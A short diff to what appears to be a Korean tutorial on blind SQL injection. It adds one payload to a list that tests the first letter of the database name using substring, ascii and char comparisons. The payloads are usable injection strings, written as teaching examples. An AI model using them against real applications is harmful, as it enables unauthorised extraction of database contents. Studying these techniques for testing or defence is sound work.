@@ -73,7 +73,7 @@ SELECT * FROM TABLE1 WHERE ID = '1' AND 1 = 2 -- 거짓
 ```SQL
 청천동' AND 'o' = substring(DB_NAME(), 1, 1) --
 청천동' AND 111 = ascii(substring(DB_NAME(), 1, 1)) --
-
+청천동' AND char(111) = substring(DB_NAME(), 1, 1) --
 -- 아스키코드 111 : 알파벳 'o' 
 ```
 
